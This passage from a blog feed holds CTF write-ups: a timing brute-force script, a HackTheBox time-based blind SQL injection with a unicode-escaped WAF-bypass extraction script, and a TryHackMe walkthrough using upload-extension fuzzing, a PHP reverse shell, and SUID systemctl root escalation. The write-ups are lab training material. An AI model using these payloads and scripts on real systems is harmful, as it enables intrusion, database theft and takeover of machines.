class='line'>from requests import post</div><div class='line'></div><div class='line'>char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + '&#123;' + '&#125;'  </div><div class='line'>url = "http://139.59.46.128:2345/"</div><div class='line'></div><div class='line'>flag = ''</div><div class='line'>#flag = 'enc0re&#123;5'</div><div class='line'></div><div class='line'>print("[*]Getting the password.......")</div><div class='line'>with FuturesSession(max_workers=len(char_set)) as session:</div><div class='line'>    stat = &#123;&#125;</div><div class='line'>    while not flag.endswith("&#125;"):</div><div class='line'>        threads = [</div><div class='line'>                    session.post(url, data=&#123;"password": f"&#123;flag + char&#125;"&#125;) </div><div class='line'>                    for char in char_set</div><div class='line'>                ]</div><div class='line'></div><div class='line'>        flag += max(zip((thread.result().elapsed.total_seconds() for thread in threads), char_set))[1]</div><div class='line'>        print(f"[*]Password: &#123;flag&#125;")</div><div class='line'></div><div class='line'>print(f"[!]Password: &#123;flag&#125;")</div><div class='line'></div><div class='line'>print("[*]Submitting the flag....")</div><div class='line'></div><div class='line'>r = post(url, data=&#123;"password":f"&#123;flag&#125;"&#125;)</div><div class='line'></div><div class='line'>print(r.text)</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><ul><li>The concept is simple we’re bruteforcing one character at a time and looking for the one which takes the longest to give a response back &amp; adding it to the flag variable(string) &amp; we’re using multiprocessing(<a href="https://pythonrepo.com/repo/ross-requests-futures-python-working-with-http" rel="nofollow noopener noreferrer external" target="_blank">future library</a>)</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/5.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/5.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/7.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/7.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>Running the script we got the flag</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/6.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/6.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul>]]>
    </content>
    <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
    <category term="sqli" scheme="https://urara-demo.netlify.app/?tags=sqli" />
    <category term="web" scheme="https://urara-demo.netlify.app/?tags=web" />
  </entry>
  <entry>
    <title type="html"><![CDATA[HackTheBox Challenge - Web - wafwaf]]></title>
    <link href="https://urara-demo.netlify.app/HackTheBox/wafwaf" />
    <id>https://urara-demo.netlify.app/HackTheBox/wafwaf</id>
    <published>2021-08-21T00:00:00.000Z</published>
    <updated>2023-01-23T19:48:11.911Z</updated>
    <content type="html">
      <![CDATA[<ul><li>Let’s start with the challenge. It’s a medium category challenge </li><li>If we navigate to the given ip address we get this source code<img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img1.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img1.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'>&lt;?php error_reporting(0);</div><div class='line'>require 'config.php';</div><div class='line'></div><div class='line'>class db extends Connection </div><div class='line'>&#123;</div><div class='line'>    public function waf($s) </div><div class='line'>    &#123;</div><div class='line'>        if (preg_match_all('/'. implode('|', array(</div><div class='line'>            '[' . preg_quote("(*&lt;=&gt;|'&-@") . ']',</div><div class='line'>            'select', 'and', 'or', 'if', 'by', 'from', </div><div class='line'>            'where', 'as', 'is', 'in', 'not', 'having'</div><div class='line'>        )) . '/i', $s, $matches)) </div><div class='line'>            die(var_dump($matches[0]));</div><div class='line'>        </div><div class='line'>        return json_decode($s);</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    public function query($sql) </div><div class='line'>    &#123;</div><div class='line'>        $args = func_get_args();</div><div class='line'>        unset($args[0]);</div><div class='line'>        return parent::query(vsprintf($sql, $args));</div><div class='line'>    &#125;</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>$db = new db();</div><div class='line'></div><div class='line'>if ($_SERVER['REQUEST_METHOD'] == 'POST') </div><div class='line'>&#123;</div><div class='line'>    $obj = $db-&gt;waf(file_get_contents('php://input'));</div><div class='line'>    $db-&gt;query("SELECT note FROM notes WHERE assignee = '%s'", $obj-&gt;user);</div><div class='line'></div><div class='line'>&#125; </div><div class='line'>else </div><div class='line'>&#123;</div><div class='line'>    die(highlight_file(__FILE__, 1));</div><div class='line'>&#125;</div><div class='line'>?&gt;</div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>Starting from the top the function <code>error_reporting(0);</code> is used to remove all errors, warnings, parse messages, and notices, the parameter that should be passed to the error_reporting function <strong>is zero</strong>.</p></li><li><p>Then we have a <code>db</code> class which inheriting from the <code>Connection</code> class. Inside this class we have a method(function) called <code>waf</code> which is basically filtering out our inputs and working as some kind of firewall hence the name waf:<code>web application firewall</code>. </p></li><li><p>Then the <code>preg_match_all()</code> function returns the number of matches of a pattern that were found in a string and populates a variable with the matches that were found.</p></li><li><p>The <code>implode()</code> is a builtin function in PHP and is used to join the elements of an array. implode() is an alias for <a href="https://www.geeksforgeeks.org/php-join-function/" rel="nofollow noopener noreferrer external" target="_blank">PHP | join() function</a> and works exactly same as that of join() function. </p></li><li><p>And the <code>preg_quote()</code> function adds a backslash to characters that have a special meaning in regular expressions so that searches for the literal characters can be done. This function is useful when using user input in regular expressions.</p></li><li><p>So if we insert any kind of input which contains the black listed commands the query will simply die dumping the matches &amp; will not return anything. </p></li><li><p>Playing with the input field &amp; I got these</p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img2.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img2.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img3.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img3.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img4.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img4.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img5.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img5.png" class="rounded-lg my-2" loading="lazy" decoding="async"></p></li><li><p>So <code>&#39;</code> is getting filtered but we can use <code>&quot;</code> and also case-insensitive.</p></li><li><p>After some more research I found this article which states we can bypass WAFs by sending uincode escaped characters  sending them as JSON objects. <a href="https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/" rel="nofollow noopener noreferrer external" target="_blank">https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/</a></p></li><li><p>Some hard word trail &amp; error i finally created a payload which actually works <code>{&quot;user&quot;:&quot;d&#39; AND (SELECT 1337 FROM (SELECT(SLEEP(5)))NtXP)-- wxyg&quot;}</code></p></li><li><p>Building on this I created a script for this</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" py="true"><div class="language-id">py</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>#TODO: Too slow add threading </div><div class='line'>import requests</div><div class='line'>from time import time</div><div class='line'>from sys import argv</div><div class='line'>import string</div><div class='line'></div><div class='line'>url = f"http://&#123;argv[1]&#125;/"</div><div class='line'>char_set = string.ascii_lowercase + '_' #+ string.digits  </div><div class='line'>flag_set = string.ascii_lowercase + '_' + string.digits + '&#125;' #+ string.ascii_uppercase </div><div class='line'></div><div class='line'>def uni_encode(payload):</div><div class='line'>result = ""</div><div class='line'>for i in range(len(payload)):</div><div class='line'>result += '\u%.4X' % ord(payload[i])</div><div class='line'>return result</div><div class='line'></div><div class='line'>def fetch_data(url, len_, name):</div><div class='line'>global database</div><div class='line'>print("[*]Getting info...")</div><div class='line'>res = ""</div><div class='line'>#print('&#123;"user":"%s"&#125;' % payload)</div><div class='line'>for i in range(1, len_+1):</div><div class='line'>for char in char_set:</div><div class='line'>payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, &#123;i&#125;, 1) FROM information_schema.columns WHERE table_schema LIKE '&#123;database&#125;' AND table_name LIKE '%flag%' LIMIT 1 ) = '&#123;char&#125;' ,SLEEP(5),0))))x)-- wxyg"</div><div class='line'>#print (payload)</div><div class='line'>#exit()</div><div class='line'>encoded_payload = uni_encode(payload)</div><div class='line'>json_data = '&#123;"user":"%s"&#125;' % encoded_payload</div><div class='line'></div><div class='line'>#print(encoded_payload)</div><div class='line'>#print(json_data)</div><div class='line'>try:</div><div class='line'>start = time()</div><div class='line'>r = requests.post(url, data=json_data)</div><div class='line'>end = time()</div><div class='line'>except :</div><div class='line'>pass</div><div class='line'></div><div class='line'>if (end - start) &gt; 5:</div><div class='line'>res += char</div><div class='line'>print(f"[*]&#123;name&#125;: &#123;res&#125;")</div><div class='line'>#break</div><div class='line'></div><div class='line'>return res</div><div class='line'></div><div class='line'>def get_flag(url):</div><div class='line'>global database, table, column</div><div class='line'>print("[*]Getting Flag...")</div><div class='line'>flag = "HTB&#123;"</div><div class='line'></div><div class='line'>while '&#125;' not in flag:</div><div class='line'>pos = len(flag) + 1</div><div class='line'>for char in flag_set:</div><div class='line'>payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(&#123;column&#125;, &#123;pos&#125;, 1) FROM &#123;database&#125;.&#123;table&#125; ) = '&#123;char&#125;', SLEEP(3), 0))))x)-- wxyg"</div><div class='line'>#print (payload)</div><div class='line'>#exit()</div><div class='line'>encoded_payload = uni_encode(payload)</div><div class='line'>json_data = '&#123;"user":"%s"&#125;' % encoded_payload</div><div class='line'></div><div class='line'>#print(encoded_payload)</div><div class='line'>#print(json_data)</div><div class='line'>try:</div><div class='line'>start = time()</div><div class='line'>r = requests.post(url, data=json_data)</div><div class='line'>end = time()</div><div class='line'>except :</div><div class='line'>pass</div><div class='line'></div><div class='line'>if (end - start) &gt; 3:</div><div class='line'>flag += char</div><div class='line'>print(f"[*]FLag: &#123;flag&#125;")</div><div class='line'>break</div><div class='line'>return flag</div><div class='line'></div><div class='line'></div><div class='line'>#payload = "d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_schema, 1, 1) FROM information_schema.tables WHERE table_schema LIKE '%db%' AND table_name LIKE '%flag%' LIMIT 1 ) = 'd' ,SLEEP(5),0))))x)-- wxyg"</div><div class='line'># database = fetch_data(url, 8, Database)</div><div class='line'># print(database)</div><div class='line'>database = "db_m8452"</div><div class='line'></div><div class='line'></div><div class='line'>#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(table_name, &#123;i&#125;, 1) FROM information_schema.tables WHERE table_schema LIKE '&#123;database&#125;' AND table_name LIKE '%flag%' LIMIT 1 ) = '&#123;char&#125;' ,SLEEP(5),0))))x)-- wxyg"</div><div class='line'>#tables = fetch_data(url, 21, "Tables")</div><div class='line'>table = "definitely_not_a_flag"</div><div class='line'></div><div class='line'>#payload = f"d' AND (SELECT 1337 FROM (SELECT((IF((SELECT SUBSTR(column_name, &#123;i&#125;, 1) FROM information_schema.columns WHERE table_schema LIKE '&#123;database&#125;' AND table_name LIKE '%flag%' LIMIT 1 ) = '&#123;char&#125;' ,SLEEP(5),0))))x)-- wxyg"</div><div class='line'>#columns = fetch_data(url, 4, "Columns")</div><div class='line'>column = "flag"</div><div class='line'></div><div class='line'>print(f"[!]Flag: &#123;get_flag(url)&#125;")</div></code></div></pre><!-- HTML_TAG_END --><ul><li>We got the info. about the database, table and column</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img6.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img6.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img7.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img7.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img8.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img8.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>We got the flag </li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img9.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/hackthebox_wafwaf/images/img9.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul>]]>
    </content>
    <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
    <category term="sqli" scheme="https://urara-demo.netlify.app/?tags=sqli" />
    <category term="htb" scheme="https://urara-demo.netlify.app/?tags=htb" />
    <category term="web" scheme="https://urara-demo.netlify.app/?tags=web" />
  </entry>
  <entry>
    <title type="html"><![CDATA[TryHackMe Vulnversity]]></title>
    <link href="https://urara-demo.netlify.app/TryHackme/Vulnversity" />
    <id>https://urara-demo.netlify.app/TryHackme/Vulnversity</id>
    <published>2021-08-09T00:00:00.000Z</published>
    <updated>2022-12-19T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<p>This a walk-through of TryHackme room <a href="https://tryhackme.com/room/vulnversity" rel="nofollow noopener noreferrer external" target="_blank">Vulnversity</a>. As always we start with the enumeration using nmap. </p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>nmap -sC -sV -A -T4 -v -oN scan/nmap 10.10.104.250 -Pn</div></code></div></pre><!-- HTML_TAG_END --><ul><li>Let’s break it down <ul><li><code>-sC</code> for default scripts</li><li><code>-sV</code> service version of the services running </li><li><code>-A</code> aggresive scan</li><li><code>-T4</code> speed of the scan</li><li><code>-v</code> for verbosity </li><li><code>-oN</code> save the output to a normal file</li><li><code>-Pn</code> don’t ping the target assuming the host is live  </li></ul></li></ul><ul><li><strong><em>Enumeration</em></strong></li><li><img src="/assets/nmap_thm.png" alt="/assets/nmap_thm.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul><h6 id="task-2"><a href="#task-2">Task 2</a></h6><ul><li>So we can see there are 6 ports open; <code>21, 22, 139, 445, 3128, 3333</code></li><li>Due to running a service version scan (<code>-sV</code>) we can see the version of the squid proxy running on port 3128<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/13.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/13.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>The <code>-p-400</code> will run a scan on the first <code>400</code> ports <ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/14.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/14.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>The <code>-n</code> will not resolve <code>DNS</code><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/15.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/15.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>By the http banner we can see the system is running <code>Ubuntu</code>. We can also user the <code>-O</code> option to do OS detection <ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/16.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/16.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>The web-server is running on <code>3333</code><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/17.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/17.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul><h6 id="task-3"><a href="#task-3">Task 3</a></h6><p>For this section we will use the tool <code>gobuster</code>.</p><p>GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.</p><p>Download GoBuster <a href="https://github.com/OJ/gobuster" rel="nofollow noopener noreferrer external" target="_blank">here</a>, or if you’re on Kali Linux 2020.1+ run <code>sudo apt-get install gobuster</code></p><ul><li>Let’s start the directory listing. </li></ul><p><code>gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50</code></p><ul><li>Break down<ul><li><code>dir</code> to let gobuster know we’re doing directory brute-forcing </li><li><code>-u</code> to specify the url </li><li><code>-w</code> to specify the wordlist </li><li><code>-t</code> to specify threads(speed). I found 50 works well. Anything more than 60 gives errors.</li></ul></li><li>If you still get errors you can remove them by using <code>2&gt;/dev/null</code> which will redirect the errors to <code>/dev/null</code> dir which is practically no-where. The command will look like this </li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>gobuster dir -u http://10.10.104.250:3333 -w /usr/share/wordlists/dirb/big.txt -t 50 2&gt;/dev/null | tee gobuster.log</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><ul><li><p>Using tee to save the output only. I personally don’t like the <code>-o</code> option which gobuster provides </p></li><li><p>We can see there is a <code>internal</code> dir gobuster found </p><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/18.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/18.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li>Navigating to this dir we can see there is a upload form</li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/19.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/19.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul><h6 id="task-4"><a href="#task-4">Task 4</a></h6><ul><li>Let’s see what we can do with it. At first we should see what files we are allowed upload. I tried uploading a jpg file <ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/110.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/110.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/111.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/111.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>It’s not allowed. We can try uploading a php file. See if we can get the php info<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/112.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/112.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/113.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/113.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>We can’t upload any php file. If we do this manually it’ll take unnecessary time &amp; effort. Let’s automate this process. First we have to see how the file upload is working. We can use burp or simply the network tab of our browser. We can use burp to check which extension will not be blocked. But I’ll write a simple python script to do this.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'>#!/usr/bin/python3</div><div class='line'>import requests</div><div class='line'>from os import rename</div><div class='line'></div><div class='line'>ip = "10.10.104.250"</div><div class='line'>url = f"http://&#123;ip&#125;:3333/internal/index.php"</div><div class='line'></div><div class='line'>extensions = [".php", ".php3", ".php4", ".php5", ".php6", ".phtml"]</div><div class='line'></div><div class='line'>old_file = "shell.php"</div><div class='line'>file_name = "shell"</div><div class='line'></div><div class='line'>for ext in extensions:</div><div class='line'>new_file = file_name + ext</div><div class='line'>#print(file)</div><div class='line'>rename(old_file, new_file)</div><div class='line'></div><div class='line'>files = &#123;"file" : open(new_file, "rb")&#125;</div><div class='line'>r = requests.post(url, files=files)</div><div class='line'>#print(r.text)</div><div class='line'>if "Extension not allowed" in r.text:</div><div class='line'>print(f"&#123;ext&#125; not allowed")</div><div class='line'>else:</div><div class='line'>print(f"&#123;ext&#125; allowed!!")</div><div class='line'>break</div><div class='line'></div><div class='line'>old_file = new_file</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><ul><li>So this script is basically going through each extension of the extensions list &amp; checking if the file extension is allowed or not &amp; renaming it then sending the file to the web-server using the requests module. So we can the <code>.phtml</code> is allowed<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/114.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/114.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>Rev-shell time. I’m using the one which comes default with kali(pentestmoney).In the shell we have to change these 2 variables<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/115.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/115.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/116.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/116.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>Success. Next setup a netcat listener &amp; navigate to the file on the server.<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/117.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/117.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/118.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/118.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/119.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/119.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li>We got the shell but it’s limited. We have to stabilize it.</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>python3 -c 'import pty;pty.spawn("/bin/bash")'</div><div class='line'>export TERM=xterm</div><div class='line'>Ctrl + Z</div><div class='line'>stty raw -echo; fg</div></code></div></pre><!-- HTML_TAG_END --><ul><li>We got the user flag. User is <code>Bill</code><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/120.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/120.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul><h6 id="task-5"><a href="#task-5">Task 5</a></h6><ul><li><p>Now Privilege Escalation. As this task suggests we’re gonna search for <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/" rel="nofollow noopener noreferrer external" target="_blank">SUID binaries</a></p></li><li><p>Search for SUID bits on the machine <code>find / -perm -u=s -type f 2&gt;/dev/null</code></p></li><li><p>There is an unusual binary here</p><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/121.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/121.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li><p><a href="https://gtfobins.github.io/#" rel="nofollow noopener noreferrer external" target="_blank">GTFO bins</a> is the goto for any kind of binary based Privilege Escalation.</p><ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/122.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/122.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li><li><p>So we’ll make a <code>System service</code> named <code>systemctl</code> &amp; run it using it’s relative path <code>./systemctl</code> &amp; we’ll execute the command <code>/bin/bash -c &quot;id &gt; /tmp/output&quot;</code></p></li><li><p>The above method dosen’t work so I used this one. This one is simple I’m creating a service and giving <code>/bin/bash</code> SUID permission with <code>+s</code> option. Then executing it using the original systemctl binary.</p></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>TF=$(mktemp).service</div><div class='line'>echo '[Service]</div><div class='line'>Type=oneshot</div><div class='line'>ExecStart=/bin/sh -c "chmod +s /bin/bash"</div><div class='line'>[Install]</div><div class='line'>WantedBy=multi-user.target' &gt; $TF</div><div class='line'>systemctl link $TF</div><div class='line'>systemctl enable --now $TF</div></code></div></pre><!-- HTML_TAG_END --><ul><li>If we do <code>bash -p</code> now we can see we have effective id as root. So we own the system now<ul><li><img src="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/123.png" alt="https://gitlab.com/Aviksaikat/write-ups/-/raw/main/tryhackme/vulnversity/images/123.png" class="rounded-lg my-2" loading="lazy" decoding="async"></li></ul></li></ul>]]>
    </content>
    <category term="tryhackme" scheme="https://urara-demo.netlify.app/?tags=tryhackme" />
    <category term="ctf" scheme="https://urara-demo.netlify.app/?tags=ctf" />
    <category term="file upload" scheme="https://urara-demo.netlify.app/?tags=file%20upload" />
  </entry>
</feed>